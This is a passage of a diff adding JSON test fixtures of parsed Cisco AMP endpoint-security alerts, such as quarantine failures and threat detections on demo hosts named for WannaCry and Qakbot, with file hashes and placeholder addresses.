+        "cisco.amp.computer.active": true,
+        "cisco.amp.computer.connector_guid": "test_connector_guid",
+        "cisco.amp.computer.external_ip": "8.8.8.8",
+        "cisco.amp.computer.network_addresses": [
+            {
+                "ip": "10.10.10.10",
+                "mac": "53:74:31:cb:37:50"
+            }
+        ],
+        "cisco.amp.connector_guid": "test_connector_guid",
+        "cisco.amp.detection_id": "6419229327140847658",
+        "cisco.amp.error.description": "Object name not found",
+        "cisco.amp.error.error_code": 3221225524,
+        "cisco.amp.event_type_id": 2164260893,
+        "cisco.amp.file.disposition": "Malicious",
+        "cisco.amp.group_guids": [
+            "test_group_guid"
+        ],
+        "cisco.amp.related.mac": [
+            "53:74:31:cb:37:50"
+        ],
+        "cisco.amp.timestamp_nanoseconds": 732000000,
+        "event.action": "Retrospective Quarantine Attempt Failed",
+        "event.category": [
+            "malware"
+        ],
+        "event.dataset": "cisco.amp",
+        "event.id": 6419247189909832000,
+        "event.kind": "alert",
+        "event.module": "cisco",
+        "event.severity": 3,
+        "file.hash.sha256": "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa",
+        "fileset.name": "amp",
+        "host.hostname": "Demo_WannaCry_Ransomware",
+        "host.name": "Demo_WannaCry_Ransomware",
+        "input.type": "log",
+        "log.offset": 289168,
+        "related.hash": [
+            "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa"
+        ],
+        "related.hosts": [
+            "Demo_WannaCry_Ransomware"
+        ],
+        "related.ip": [
+            "8.8.8.8",
+            "10.10.10.10"
+        ],
+        "service.type": "cisco",
+        "tags": [
+            "cisco-amp",
+            "forwarded"
+        ]
+    },
+    {
+        "@timestamp": "2021-01-14T15:50:23.000Z",
+        "cisco.amp.computer.active": true,
+        "cisco.amp.computer.connector_guid": "test_connector_guid",
+        "cisco.amp.computer.external_ip": "8.8.8.8",
+        "cisco.amp.computer.network_addresses": [
+            {
+                "ip": "10.10.10.10",
+                "mac": "53:74:31:cb:37:50"
+            }
+        ],
+        "cisco.amp.connector_guid": "test_connector_guid",
+        "cisco.amp.detection_id": "6419204897366867969",
+        "cisco.amp.error.description": "Object name not found",
+        "cisco.amp.error.error_code": 3221225524,
+        "cisco.amp.event_type_id": 2164260893,
+        "cisco.amp.file.disposition": "Malicious",
+        "cisco.amp.group_guids": [
+            "test_group_guid"
+        ],
+        "cisco.amp.related.mac": [
+            "53:74:31:cb:37:50"
+        ],
+        "cisco.amp.timestamp_nanoseconds": 717000000,
+        "event.action": "Retrospective Quarantine Attempt Failed",
+        "event.category": [
+            "malware"
+        ],
+        "event.dataset": "cisco.amp",
+        "event.id": 6419247189909832000,
+        "event.kind": "alert",
+        "event.module": "cisco",
+        "event.severity": 3,
+        "file.hash.sha256": "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa",
+        "fileset.name": "amp",
+        "host.hostname": "Demo_WannaCry_Ransomware",
+        "host.name": "Demo_WannaCry_Ransomware",
+        "input.type": "log",
+        "log.offset": 290380,
+        "related.hash": [
+            "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa"
+        ],
+        "related.hosts": [
+            "Demo_WannaCry_Ransomware"
+        ],
+        "related.ip": [
+            "8.8.8.8",
+            "10.10.10.10"
+        ],
+        "service.type": "cisco",
+        "tags": [
+            "cisco-amp",
+            "forwarded"
+        ]
+    },
+    {
+        "@timestamp": "2021-01-14T15:50:23.000Z",
+        "cisco.amp.computer.active": true,
+        "cisco.amp.computer.connector_guid": "test_connector_guid",
+        "cisco.amp.computer.external_ip": "8.8.8.8",
+        "cisco.amp.computer.network_addresses": [
+            {
+                "ip": "10.10.10.10",
+                "mac": "53:74:31:cb:37:50"
+            }
+        ],
+        "cisco.amp.connector_guid": "test_connector_guid",
+        "cisco.amp.detection_id": "6419179204872503298",
+        "cisco.amp.error.description": "Object name not found",
+        "cisco.amp.error.error_code": 3221225524,
+        "cisco.amp.event_type_id": 2164260893,
+        "cisco.amp.file.disposition": "Malicious",
+        "cisco.amp.group_guids": [
+            "test_group_guid"
+        ],
+        "cisco.amp.related.mac": [
+            "53:74:31:cb:37:50"
+        ],
+        "cisco.amp.timestamp_nanoseconds": 686000000,
+        "event.action": "Retrospective Quarantine Attempt Failed",
+        "event.category": [
+            "malware"
+        ],
+        "event.dataset": "cisco.amp",
+        "event.id": 6419247189909832000,
+        "event.kind": "alert",
+        "event.module": "cisco",
+        "event.severity": 3,
+        "file.hash.sha256": "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa",
+        "fileset.name": "amp",
+        "host.hostname": "Demo_WannaCry_Ransomware",
+        "host.name": "Demo_WannaCry_Ransomware",
+        "input.type": "log",
+        "log.offset": 291592,
+        "related.hash": [
+            "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa"
+        ],
+        "related.hosts": [
+            "Demo_WannaCry_Ransomware"
+        ],
+        "related.ip": [
+            "8.8.8.8",
+            "10.10.10.10"
+        ],
+        "service.type": "cisco",
+        "tags": [
+            "cisco-amp",
+            "forwarded"
+        ]
+    },
+    {
+        "@timestamp": "2021-01-14T15:50:23.000Z",
+        "cisco.amp.computer.active": true,
+        "cisco.amp.computer.connector_guid": "test_connector_guid",
+        "cisco.amp.computer.external_ip": "8.8.8.8",
+        "cisco.amp.computer.network_addresses": [
+            {
+                "ip": "10.10.10.10",
+                "mac": "53:74:31:cb:37:50"
+            }
+        ],
+        "cisco.amp.connector_guid": "test_connector_guid",
+        "cisco.amp.detection_id": "6419229327140847665",
+        "cisco.amp.error.description": "Object name not found",
+        "cisco.amp.error.error_code": 3221225524,
+        "cisco.amp.event_type_id": 2164260893,
+        "cisco.amp.file.disposition": "Malicious",
+        "cisco.amp.group_guids": [
+            "test_group_guid"
+        ],
+        "cisco.amp.related.mac": [
+            "53:74:31:cb:37:50"
+        ],
+        "cisco.amp.timestamp_nanoseconds": 686000000,
+        "event.action": "Retrospective Quarantine Attempt Failed",
+        "event.category": [
+            "malware"
+        ],
+        "event.dataset": "cisco.amp",
+        "event.id": 6419247189909832000,
+        "event.kind": "alert",
+        "event.module": "cisco",
+        "event.severity": 3,
+        "file.hash.sha256": "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa",
+        "fileset.name": "amp",
+        "host.hostname": "Demo_WannaCry_Ransomware",
+        "host.name": "Demo_WannaCry_Ransomware",
+        "input.type": "log",
+        "log.offset": 292804,
+        "related.hash": [
+            "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa"
+        ],
+        "related.hosts": [
+            "Demo_WannaCry_Ransomware"
+        ],
+        "related.ip": [
+            "8.8.8.8",
+            "10.10.10.10"
+        ],
+        "service.type": "cisco",
+        "tags": [
+            "cisco-amp",
+            "forwarded"
+        ]
+    },
+    {
+        "@timestamp": "2021-01-14T15:50:23.000Z",
+        "cisco.amp.computer.active": true,
+        "cisco.amp.computer.connector_guid": "test_connector_guid",
+        "cisco.amp.computer.external_ip": "8.8.8.8",
+        "cisco.amp.computer.network_addresses": [
+            {
+                "ip": "10.10.10.10",
+                "mac": "53:74:31:cb:37:50"
+            }
+        ],
+        "cisco.amp.connector_guid": "test_connector_guid",
+        "cisco.amp.detection_id": "6419204897366867977",
+        "cisco.amp.error.description": "Object name not found",
+        "cisco.amp.error.error_code": 3221225524,
+        "cisco.amp.event_type_id": 2164260893,
+        "cisco.amp.file.disposition": "Malicious",
+        "cisco.amp.group_guids": [
+            "test_group_guid"
+        ],
+        "cisco.amp.related.mac": [
+            "53:74:31:cb:37:50"
+        ],
+        "cisco.amp.timestamp_nanoseconds": 639000000,
+        "event.action": "Retrospective Quarantine Attempt Failed",
+        "event.category": [
+            "malware"
+        ],
+        "event.dataset": "cisco.amp",
+        "event.id": 6419247189909832000,
+        "event.kind": "alert",
+        "event.module": "cisco",
+        "event.severity": 3,
+        "file.hash.sha256": "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa",
+        "fileset.name": "amp",
+        "host.hostname": "Demo_WannaCry_Ransomware",
+        "host.name": "Demo_WannaCry_Ransomware",
+        "input.type": "log",
+        "log.offset": 294016,
+        "related.hash": [
+            "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa"
+        ],
+        "related.hosts": [
+            "Demo_WannaCry_Ransomware"
+        ],
+        "related.ip": [
+            "8.8.8.8",
+            "10.10.10.10"
+        ],
+        "service.type": "cisco",
+        "tags": [
+            "cisco-amp",
+            "forwarded"
+        ]
+    },
+    {
+        "@timestamp": "2021-01-14T15:24:25.000Z",
+        "cisco.amp.computer.active": true,
+        "cisco.amp.computer.connector_guid": "test_connector_guid",
+        "cisco.amp.computer.external_ip": "8.8.8.8",
+        "cisco.amp.computer.network_addresses": [
+            {
+                "ip": "10.10.10.10",
+                "mac": "02:2f:e0:10:03:5d"
+            }
+        ],
+        "cisco.amp.connector_guid": "test_connector_guid",
+        "cisco.amp.detection_id": "6412604589194870787",
+        "cisco.amp.error.description": "Object name not found",
+        "cisco.amp.error.error_code": 3221225524,
+        "cisco.amp.event_type_id": 2164260880,
+        "cisco.amp.file.disposition": "Malicious",
+        "cisco.amp.group_guids": [
+            "test_group_guid"
+        ],
+        "cisco.amp.related.mac": [
+            "02:2f:e0:10:03:5d"
+        ],
+        "cisco.amp.timestamp_nanoseconds": 994000000,
+        "event.action": "Quarantine Failure",
+        "event.category": [
+            "malware"
+        ],
+        "event.dataset": "cisco.amp",
+        "event.id": 6412604589194871000,
+        "event.kind": "alert",
+        "event.module": "cisco",
+        "event.severity": 2,
+        "file.hash.sha256": "d177e09a9ae147741a3ef8b5d3aa9c359d70d602d32f2c4bb0e2d3208cdca446",
+        "fileset.name": "amp",
+        "host.hostname": "Demo_Qakbot_3",
+        "host.name": "Demo_Qakbot_3",
+        "input.type": "log",
+        "log.offset": 305177,
+        "related.hash": [
+            "d177e09a9ae147741a3ef8b5d3aa9c359d70d602d32f2c4bb0e2d3208cdca446"
+        ],
+        "related.hosts": [
+            "Demo_Qakbot_3"
+        ],
+        "related.ip": [
+            "8.8.8.8",
+            "10.10.10.10"
+        ],
+        "service.type": "cisco",
+        "tags": [
+            "cisco-amp",
+            "forwarded"
+        ]
+    },
+    {
+        "@timestamp": "2021-01-14T15:24:25.000Z",
+        "cisco.amp.computer.active": true,
+        "cisco.amp.computer.connector_guid": "test_connector_guid",
+        "cisco.amp.computer.external_ip": "8.8.8.8",
+        "cisco.amp.computer.network_addresses": [
+            {
+                "ip": "10.10.10.10",
+                "mac": "02:2f:e0:10:03:5d"
+            }
+        ],
+        "cisco.amp.connector_guid": "test_connector_guid",
+        "cisco.amp.detection": "W32.File.MalParent",
+        "cisco.amp.detection_id": "6412604589194870786",
+        "cisco.amp.event_type_id": 1090519054,
+        "cisco.amp.file.disposition": "Malicious",
+        "cisco.amp.group_guids": [
+            "test_group_guid"
+        ],
+        "cisco.amp.related.mac": [
+            "02:2f:e0:10:03:5d"
+        ],
+        "cisco.amp.timestamp_nanoseconds": 479000000,
+        "event.action": "Threat Detected",
+        "event.category": [
+            "file",
+            "malware"
+        ],
+        "event.dataset": "cisco.amp",
+        "event.id": 6412604589194871000,
+        "event.kind": "alert",
+        "event.module": "cisco",
+        "event.severity": 2,
+        "file.hash.sha256": "d177e09a9ae147741a3ef8b5d3aa9c359d70d602d32f2c4bb0e2d3208cdca446",
+        "file.name": "",
+        "file.path": "",
+        "fileset.name": "amp",
+        "host.hostname": "Demo_Qakbot_3",
+        "host.name": "Demo_Qakbot_3",
+        "host.user.name": "user@testdomain.com",
+        "input.type": "log",
+        "log.offset": 307732,
+        "related.hash": [
+            "d177e09a9ae147741a3ef8b5d3aa9c359d70d602d32f2c4bb0e2d3208cdca446"
+        ],
+        "related.hosts": [
+            "Demo_Qakbot_3"
+        ],
+        "related.ip": [
+            "8.8.8.8",
+            "10.10.10.10"
+        ],
+        "related.user": [
+            "user@testdomain.com"
+        ],
+        "service.type": "cisco",
+        "tags": [
+            "cisco-amp",
+            "forwarded"
+        ]
+    },
+    {
+        "@timestamp": "2021-01-14T15:24:25.000Z",
+        "cisco.amp.computer.active": true,
+        "cisco.amp.computer.connector_guid": "test_connector_guid",
+        "cisco.amp.computer.external_ip": "8.8.8.8",
+        "cisco.amp.computer.network_addresses": [
+            {
+                "ip": "10.10.10.10",
+                "mac": "02:2f:e0:10:03:5d"
+            }
+        ],
+        "cisco.amp.connector_guid": "test_connector_guid",
+        "cisco.amp.detection": "W32.File.MalParent",
+        "cisco.amp.detection_id": "6412604589194870785",
+        "cisco.amp.event_type_id": 1090519054,
+        "cisco.amp.file.disposition": "Malicious",
+        "cisco.amp.group_guids": [
+            "test_group_guid"
+        ],
+        "cisco.amp.related.mac": [
+            "02:2f:e0:10:03:5d"
+        ],
+        "cisco.amp.timestamp_nanoseconds": 479000000,
+        "event.action": "Threat Detected",
+        "event.category": [
+            "file",
+            "malware"
+        ],
+        "event.dataset": "cisco.amp",
+        "event.id": 6412604589194871000,
+        "event.kind": "alert",
+        "event.module": "cisco",
+        "event.severity": 2,
+        "file.hash.md5": "32c9e6737dbdcbfb7563a3f27e2b1571",
+        "file.hash.sha1": "f5a171c879b90e77861daf19741b373646d791ff",
+        "file.hash.sha256": "d177e09a9ae147741a3ef8b5d3aa9c359d70d602d32f2c4bb0e2d3208cdca446",
+        "file.name": "QuotaGroup.exe",
+        "file.path": "\\\\?\\C:\\Users\\johndoe\\AppData\\Local\\QuotaGroup\\QuotaGroup.exe",
+        "fileset.name": "amp",
+        "host.hostname": "Demo_Qakbot_3",
+        "host.name": "Demo_Qakbot_3",
+        "host.os.family": "windows",
+        "host.os.platform": "windows",
+        "host.user.name": "user@testdomain.com",
+        "input.type": "log",
+        "log.offset": 308931,
+        "related.hash": [
+            "d177e09a9ae147741a3ef8b5d3aa9c359d70d602d32f2c4bb0e2d3208cdca446",
+            "32c9e6737dbdcbfb7563a3f27e2b1571",
+            "f5a171c879b90e77861daf19741b373646d791ff"
+        ],
+        "related.hosts": [
+            "Demo_Qakbot_3"
+        ],
+        "related.ip": [
+            "8.8.8.8",
+            "10.10.10.10"
+        ],
+        "related.user": [
+            "user@testdomain.com"
+        ],
+        "service.type": "cisco",
+        "tags": [
+            "cisco-amp",
+            "forwarded"
+        ]
+    },
+    {
+        "@timestamp": "2021-01-14T15:18:49.000Z",
+        "cisco.amp.computer.active": true,
+        "cisco.amp.computer.connector_guid": "test_connector_guid",
+        "cisco.amp.computer.external_ip": "8.8.8.8",
+        "cisco.amp.computer.network_addresses": [
+            {
+                "ip": "10.10.10.10",
+                "mac": "53:74:31:cb:37:50"
+            }
+        ],
+        "cisco.amp.connector_guid": "test_connector_guid",
+        "cisco.amp.detection_id": "6419239055241773128",
+        "cisco.amp.error.description": "Object name not found",
+        "cisco.amp.error.error_code": 3221225524,
+        "cisco.amp.event_type_id": 2164260880,
+        "cisco.amp.file.disposition": "Malicious",
+        "cisco.amp.group_guids": [
+            "test_group_guid"
+        ],
+        "cisco.amp.related.mac": [
+            "53:74:31:cb:37:50"
+        ],
+        "cisco.amp.timestamp_nanoseconds": 242000000,
+        "event.action": "Quarantine Failure",
+        "event.category": [
+            "malware"
+        ],
+        "event.dataset": "cisco.amp",
+        "event.id": 6419239055241773000,
+        "event.kind": "alert",
+        "event.module": "cisco",
+        "event.severity": 2,
+        "file.hash.sha256": "24d004a104d4d54034dbcffc2a4b19a11f39008a575aa614ea04703480b1022c",
+        "fileset.name": "amp",
+        "host.hostname": "Demo_WannaCry_Ransomware",
+        "host.name": "Demo_WannaCry_Ransomware",
+        "input.type": "log",
+        "log.offset": 311413,
+        "related.hash": [
+            "24d004a104d4d54034dbcffc2a4b19a11f39008a575aa614ea04703480b1022c"
+        ],
+        "related.hosts": [
+            "Demo_WannaCry_Ransomware"
+        ],
+        "related.ip": [
+            "8.8.8.8",
+            "10.10.10.10"
+        ],
+        "service.type": "cisco",
+        "tags": [
+            "cisco-amp",
+            "forwarded"
+        ]
+    },
+    {
+        "@timestamp": "2021-01-14T15:18:48.000Z",
+        "cisco.amp.computer.active": true,
+        "cisco.amp.computer.connector_guid": "test_connector_guid",
+        "cisco.amp.computer.external_ip": "8.8.8.8",
+        "cisco.amp.computer.network_addresses": [
+            {
+                "ip": "10.10.10.10",
+                "mac": "53:74:31:cb:37:50"
+            }
+        ],
+        "cisco.amp.connector_guid": "test_connector_guid",
+        "cisco.amp.detection_id": "6419239046651838535",
+        "cisco.amp.event_type_id": 553648143,
+        "cisco.amp.file.disposition": "Malicious",
+        "cisco.amp.group_guids": [
+            "test_group_guid"
+        ],
+        "cisco.amp.related.mac": [
+            "53:74:31:cb:37:50"
+        ],
+        "cisco.amp.timestamp_nanoseconds": 587000000,
+        "event.action": "Threat Quarantined",
+        "event.category": [
+            "malware"
+        ],
+        "event.dataset": "cisco.amp",
+        "event.id": 6419239050946806000,
+        "event.kind": "alert",
+        "event.module": "cisco",
+        "event.severity": 2,
+        "file.hash.sha256": "24d004a104d4d54034dbcffc2a4b19a11f39008a575aa614ea04703480b1022c",
+        "fileset.name": "amp",
+        "host.hostname": "Demo_WannaCry_Ransomware",
+        "host.name": "Demo_WannaCry_Ransomware",
+        "input.type": "log",
+        "log.offset": 314113,
+        "related.hash": [
+            "24d004a104d4d54034dbcffc2a4b19a11f39008a575aa614ea04703480b1022c"
+        ],
+        "related.hosts": [
+            "Demo_WannaCry_Ransomware"
+        ],
+        "related.ip": [
+            "8.8.8.8",
+            "10.10.10.10"
+        ],
+        "service.type": "cisco",
+        "tags": [
+            "cisco-amp",
+            "forwarded"
+        ]
+    },
+    {
+        "@timestamp": "2021-01-14T14:48:39.000Z",
+        "cisco.amp.cloud_ioc.description": "Qakbot is a worm that spreads through network shares and removable drives. It downloads additional files, steals information, and opens a back door on the compromised computer. The worm also contains rootkit functionality to allow it to hide its presence. A command or file path similar to one used by Qakbot for spreading across the network or persistence was seen.",
+        "cisco.amp.cloud_ioc.short_description": "W32.Qakbot.ioc",
+        "cisco.amp.computer.active": true,
+        "cisco.amp.computer.connector_guid": "test_connector_guid",
+        "cisco.amp.computer.external_ip": "8.8.8.8",
+        "cisco.amp.computer.network_addresses": [
+            {
+                "ip": "10.10.10.10",
+                "mac": "f9:65:da:22:2a:41"
+            }
+        ],
+        "cisco.amp.connector_guid": "test_connector_guid",
+        "cisco.amp.event_type_id": 1107296274,
+        "cisco.amp.file.disposition": "Unknown",
+        "cisco.amp.file.parent.disposition": "Clean",
+        "cisco.amp.group_guids": [
+            "test_group_guid"
+        ],
+        "cisco.amp.related.mac": [
+            "f9:65:da:22:2a:41"
+        ],
+        "cisco.amp.timestamp_nanoseconds": 948000000,
+        "event.action": "Cloud IOC",
+        "event.category": [
+            "file"
+        ],
+        "event.dataset": "cisco.amp",
+        "event.id": 1492807649948000000,
+        "event.kind": "alert",
+        "event.module": "cisco",
+        "event.severity": 4,
+        "event.start": "2021-01-14T14:48:39.000Z",
+        "file.hash.sha256": "6b7d5fdf4b9d42a985cf861c5ef28f5fa914b418c22e4bf5b56bac12251bcd6c",
+        "file.name": "yuyfhonu.exe",
+        "file.path": "/C:/Users/johndoe/AppData/Roaming/Microsoft/Yuyfhonuu/yuyfhonu.exe",
+        "fileset.name": "amp",
+        "host.hostname": "Demo_Qakbot_1",
+        "host.name": "Demo_Qakbot_1",
+        "input.type": "log",
+        "log.offset": 316839,
+        "process.hash.sha256": "d5bc504277172be5c54b60ad5c13209dc1f729131def084de3ec8c72e54c58ef",
+        "related.hash": [
+            "6b7d5fdf4b9d42a985cf861c5ef28f5fa914b418c22e4bf5b56bac12251bcd6c"
+        ],
+        "related.hosts": [
+            "Demo_Qakbot_1"
+        ],
+        "related.ip": [
+            "8.8.8.8",
+            "10.10.10.10"
+        ],
+        "service.type": "cisco",
+        "tags": [
+            "cisco-amp",
+            "forwarded"
+        ]
+    },
+    {
+        "@timestamp": "2021-01-14T14:41:06.000Z",
+        "cisco.amp.computer.active": true,
+        "cisco.amp.computer.connector_guid": "test_connector_guid",
+        "cisco.amp.computer.external_ip": "8.8.8.8",
+        "cisco.amp.computer.network_addresses": [
+            {
+                "ip": "10.10.10.10",
+                "mac": "53:74:31:cb:37:50"
+            }
+        ],
+        "cisco.amp.connector_guid": "test_connector_guid",
+        "cisco.amp.detection_id": "6419229335730782278",
+        "cisco.amp.error.description": "Object name not found",
+        "cisco.amp.error.error_code": 3221225524,
+        "cisco.amp.event_type_id": 2164260880,
+        "cisco.amp.file.disposition": "Malicious",
+        "cisco.amp.group_guids": [
+            "test_group_guid"
+        ],
+        "cisco.amp.related.mac": [
+            "53:74:31:cb:37:50"
+        ],
+        "cisco.amp.timestamp_nanoseconds": 773000000,
+        "event.action": "Quarantine Failure",
+        "event.category": [
+            "malware"
+        ],
+        "event.dataset": "cisco.amp",
+        "event.id": 6419229335730782000,
+        "event.kind": "alert",
+        "event.module": "cisco",
+        "event.severity": 2,
+        "file.hash.sha256": "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa",
+        "fileset.name": "amp",
+        "host.hostname": "Demo_WannaCry_Ransomware",
+        "host.name": "Demo_WannaCry_Ransomware",
+        "input.type": "log",
+        "log.offset": 318637,
+        "related.hash": [
+            "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa"
+        ],
+        "related.hosts": [
+            "Demo_WannaCry_Ransomware"
+        ],
+        "related.ip": [
+            "8.8.8.8",
+            "10.10.10.10"
+        ],
+        "service.type": "cisco",
+        "tags": [
+            "cisco-amp",
+            "forwarded"
+        ]
+    },
+    {
+        "@timestamp": "2021-01-14T14:41:06.000Z",
+        "cisco.amp.computer.active": true,
+        "cisco.amp.computer.connector_guid": "test_connector_guid",
+        "cisco.amp.computer.external_ip": "8.8.8.8",
+        "cisco.amp.computer.network_addresses": [
+            {
+                "ip": "10.10.10.10",
+                "mac": "53:74:31:cb:37:50"
+            }
+        ],
+        "cisco.amp.connector_guid": "test_connector_guid",
+        "cisco.amp.detection_id": "6419229335730782277",
+        "cisco.amp.error.description": "Object name not found",
+        "cisco.amp.error.error_code": 3221225524,
+        "cisco.amp.event_type_id": 2164260880,
+        "cisco.amp.file.disposition": "Malicious",
+        "cisco.amp.group_guids": [
+            "test_group_guid"
+        ],
+        "cisco.amp.related.mac": [
+            "53:74:31:cb:37:50"
+        ],
+        "cisco.amp.timestamp_nanoseconds": 664000000,
+        "event.action": "Quarantine Failure",
+        "event.category": [
+            "malware"
+        ],
+        "event.dataset": "cisco.amp",
+        "event.id": 6419229335730782000,
+        "event.kind": "alert",
+        "event.module": "cisco",
+        "event.severity": 2,
+        "file.hash.sha256": "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa",
+        "fileset.name": "amp",
+        "host.hostname": "Demo_WannaCry_Ransomware",
+        "host.name": "Demo_WannaCry_Ransomware",
+        "input.type": "log",
+        "log.offset": 319830,
+        "related.hash": [
+            "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa"
+        ],
+        "related.hosts": [
+            "Demo_WannaCry_Ransomware"
+        ],
+        "related.ip": [
+            "8.8.8.8",
+            "10.10.10.10"
+        ],
+        "service.type": "cisco",
+        "tags": [
+            "cisco-amp",
+            "forwarded"
+        ]
+    },
+    {
+        "@timestamp": "2021-01-14T14:41:06.000Z",
+        "cisco.amp.computer.active": true,
+        "cisco.amp.computer.connector_guid": "test_connector_guid",
+        "cisco.amp.computer.external_ip": "8.8.8.8",
+        "cisco.amp.computer.network_addresses": [
+            {
+                "ip": "10.10.10.10",
+                "mac": "53:74:31:cb:37:50"
+            }
+        ],
+        "cisco.amp.connector_guid": "test_connector_guid",
+        "cisco.amp.detection_id": "6419229335730782276",
+        "cisco.amp.error.description": "Object name not found",
+        "cisco.amp.error.error_code": 3221225524,
+        "cisco.amp.event_type_id": 2164260880,
+        "cisco.amp.file.disposition": "Malicious",
+        "cisco.amp.group_guids": [
+            "test_group_guid"
+        ],
+        "cisco.amp.related.mac": [
+            "53:74:31:cb:37:50"
+        ],
+        "cisco.amp.timestamp_nanoseconds": 570000000,
+        "event.action": "Quarantine Failure",
+        "event.category": [
+            "malware"
+        ],
+        "event.dataset": "cisco.amp",
+        "event.id": 6419229335730782000,
+        "event.kind": "alert",
+        "event.module": "cisco",
+        "event.severity": 2,
+        "file.hash.sha256": "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa",
+        "fileset.name": "amp",
+        "host.hostname": "Demo_WannaCry_Ransomware",
+        "host.name": "Demo_WannaCry_Ransomware",
+        "input.type": "log",
+        "log.offset": 321023,
+        "related.hash": [
+            "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa"
+        ],
+        "related.hosts": [
+            "Demo_WannaCry_Ransomware"
+        ],
+        "related.ip": [
+            "8.8.8.8",
+            "10.10.10.10"
+        ],
+        "service.type": "cisco",
+        "tags": [
+            "cisco-amp",
+            "forwarded"
+        ]
+    },
+    {
+        "@timestamp": "2021-01-14T14:41:06.000Z",
+        "cisco.amp.computer.active": true,
+        "cisco.amp.computer.connector_guid": "test_connector_guid",
+        "cisco.amp.computer.external_ip": "8.8.8.8",
+        "cisco.amp.computer.network_addresses": [
+            {
+                "ip": "10.10.10.10",
+                "mac": "53:74:31:cb:37:50"
+            }
+        ],
+        "cisco.amp.connector_guid": "test_connector_guid",
+        "cisco.amp.detection_id": "6419229335730782275",
+        "cisco.amp.error.description": "Object name not found",
+        "cisco.amp.error.error_code": 3221225524,
+        "cisco.amp.event_type_id": 2164260880,
+        "cisco.amp.file.disposition": "Malicious",
+        "cisco.amp.group_guids": [
+            "test_group_guid"
+        ],
+        "cisco.amp.related.mac": [
+            "53:74:31:cb:37:50"
+        ],
+        "cisco.amp.timestamp_nanoseconds": 430000000,
+        "event.action": "Quarantine Failure",
+        "event.category": [
+            "malware"
+        ],
+        "event.dataset": "cisco.amp",
+        "event.id": 6419229335730782000,
+        "event.kind": "alert",
+        "event.module": "cisco",
+        "event.severity": 2,
+        "file.hash.sha256": "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa",
+        "fileset.name": "amp",
+        "host.hostname": "Demo_WannaCry_Ransomware",
+        "host.name": "Demo_WannaCry_Ransomware",
+        "input.type": "log",
+        "log.offset": 322216,
+        "related.hash": [
+            "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa"
+        ],
+        "related.hosts": [
+            "Demo_WannaCry_Ransomware"
+        ],
+        "related.ip": [
+            "8.8.8.8",
+            "10.10.10.10"
+        ],
+        "service.type": "cisco",
+        "tags": [
+            "cisco-amp",
+            "forwarded"
+        ]
+    },
+    {
+        "@timestamp": "2021-01-14T14:41:06.000Z",
+        "cisco.amp.computer.active": true,
+        "cisco.amp.computer.connector_guid": "test_connector_guid",
+        "cisco.amp.computer.external_ip": "8.8.8.8",
+        "cisco.amp.computer.network_addresses": [
+            {
+                "ip": "10.10.10.10",
+                "mac": "53:74:31:cb:37:50"
+            }
+        ],
+        "cisco.amp.connector_guid": "test_connector_guid",
+        "cisco.amp.detection_id": "6419229335730782274",
+        "cisco.amp.error.description": "Object name not found",
+        "cisco.amp.error.error_code": 3221225524,
+        "cisco.amp.event_type_id": 2164260880,
+        "cisco.amp.file.disposition": "Malicious",
+        "cisco.amp.group_guids": [
+            "test_group_guid"
+        ],
+        "cisco.amp.related.mac": [
+            "53:74:31:cb:37:50"
+        ],
+        "cisco.amp.timestamp_nanoseconds": 368000000,
+        "event.action": "Quarantine Failure",
+        "event.category": [
+            "malware"
+        ],
+        "event.dataset": "cisco.amp",
+        "event.id": 6419229335730782000,
+        "event.kind": "alert",
+        "event.module": "cisco",
+        "event.severity": 2,
+        "file.hash.sha256": "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa",
+        "fileset.name": "amp",
+        "host.hostname": "Demo_WannaCry_Ransomware",
+        "host.name": "Demo_WannaCry_Ransomware",
+        "input.type": "log",
+        "log.offset": 323409,
+        "related.hash": [
+            "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa"
+        ],
+        "related.hosts": [
+            "Demo_WannaCry_Ransomware"
+        ],
+        "related.ip": [
+            "8.8.8.8",
+            "10.10.10.10"
+        ],
+        "service.type": "cisco",
+        "tags": [
+            "cisco-amp",
+            "forwarded"
+        ]
+    },
+    {
+        "@timestamp": "2021-01-14T14:41:06.000Z",
+        "cisco.amp.computer.active": true,
+        "cisco.amp.computer.connector_guid": "test_connector_guid",
+        "cisco.amp.computer.external_ip": "8.8.8.8",
+        "cisco.amp.computer.network_addresses": [
+            {
+                "ip": "10.10.10.10",
+                "mac": "53:74:31:cb:37:50"
+            }
+        ],
+        "cisco.amp.connector_guid": "test_connector_guid",
+        "cisco.amp.detection_id": "6419229335730782273",
+        "cisco.amp.error.description": "Object name not found",
+        "cisco.amp.error.error_code": 3221225524,
+        "cisco.amp.event_type_id": 2164260880,
+        "cisco.amp.file.disposition": "Malicious",
+        "cisco.amp.group_guids": [
+            "test_group_guid"
+        ],
+        "cisco.amp.related.mac": [
+            "53:74:31:cb:37:50"
+        ],
+        "cisco.amp.timestamp_nanoseconds": 134000000,
+        "event.action": "Quarantine Failure",
+        "event.category": [
+            "malware"
+        ],
+        "event.dataset": "cisco.amp",
+        "event.id": 6419229335730782000,
+        "event.kind": "alert",
+        "event.module": "cisco",
+        "event.severity": 2,
